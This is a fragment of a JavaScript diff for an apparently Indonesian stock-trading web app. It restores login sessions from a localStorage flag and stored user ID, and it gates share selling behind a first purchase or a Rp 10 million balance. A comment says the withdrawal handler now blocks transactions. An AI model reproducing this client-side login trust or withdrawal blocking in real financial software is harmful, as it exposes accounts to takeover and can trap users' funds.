+                 showNotification("Anda harus Log In terlebih dahulu untuk mengakses menu dana.", false, "Akses Ditolak");
                  return;
             }
 
             document.getElementById('modal-user-name').textContent = USER_NAME;
             document.getElementById('modal-user-id').textContent = currentUserId;
             document.getElementById('modal-rdn-balance').textContent = formatRupiah(rdnBalance);
-            // Default value for withdrawal amount
             document.getElementById('withdrawalAmount').value = rdnBalance >= 100000 ? 100000 : (rdnBalance > 0 ? rdnBalance : 0); 
             
             withdrawalModal.classList.remove('hidden');
@@ -961,16 +978,26 @@
             // Isi data statik 
             priceElement.textContent = currentPrice;
             changeElement.textContent = `+${priceChange} (+${percentChange}%)`;
-
-            // Initialize UI (It will show the login modal by default)
-            updateAuthUI(); 
-            updateUI(); 
             
-            // Tampilkan modal login jika belum login
-            if (!currentUserId) {
-                 loginModal.classList.remove('hidden');
-            }
+            // --- LOGIKA PERSISTENSI LOGIN ---
+            const savedLoginStatus = localStorage.getItem(LOGGED_IN_KEY);
+            const savedUserId = localStorage.getItem(USER_ID_KEY);
 
+            if (savedLoginStatus === 'true' && savedUserId) {
+                // Sesi Ditemukan: Pulihkan sesi
+                currentUserId = savedUserId;
+                loadData(); 
+                updateAuthUI(); 
+                updateUI(); 
+                showNotification("Sesi Anda dipulihkan. Selamat datang kembali!", true, "Aplikasi Siap");
+            } else {
+                // Sesi Tidak Ditemukan: Minta Login
+                currentUserId = null;
+                updateAuthUI(); 
+                updateUI(); 
+                loginModal.classList.remove('hidden'); 
+            }
+            
             // --- ATTACH EVENT LISTENERS ---
             
             // Auth Actions
@@ -982,14 +1009,11 @@
                 const isUnlockedByRules = hasMadeFirstPurchase || rdnBalance > RDN_UNLOCK_THRESHOLD;
                 
                 if (!isUnlockedByRules) {
-                    // Notifikasi Spesifik dari User
                     const message = "Penjualan saham akan berlaku jika user sudah melakukan pembelian saham pertama di aplikasi, atau saldo kas RDN Anda melebihi Rp 10 Juta.";
-                    showNotification(message, false);
+                    showNotification(message, false, "Jual Saham Dibatasi");
                 } else if (lotOwned === 0) {
-                     // Jika sudah unlock, tapi lot 0
-                     showNotification("GAGAL: Anda tidak memiliki Lot GIAA untuk dijual.", false);
+                     showNotification("GAGAL: Anda tidak memiliki Lot GIAA untuk dijual.", false, "Transaksi Gagal");
                 } else {
-                    // Izinkan penjualan jika lot dimiliki DAN unlock
                     showModal('Jual');
                 }
             });
@@ -999,13 +1023,13 @@
 
             // Form Submissions
             orderForm.addEventListener('submit', handleOrder);
-            withdrawalForm.addEventListener('submit', handleWithdrawal);
+            withdrawalForm.addEventListener('submit', handleWithdrawal); // Diperbarui untuk memblokir transaksi
             
             // Modal Closures
             cancelOrderBtn.addEventListener('click', hideModal);
             cancelWithdrawalBtn.addEventListener('click', closeWithdrawalModal);
 
-            // Payment Confirmation (THIS IS THE CRITICAL CHANGE)
+            // Payment Confirmation 
             paymentConfirmBtn.addEventListener('click', handlePaymentConfirmation);
 
             // Handle modal overlay clicks
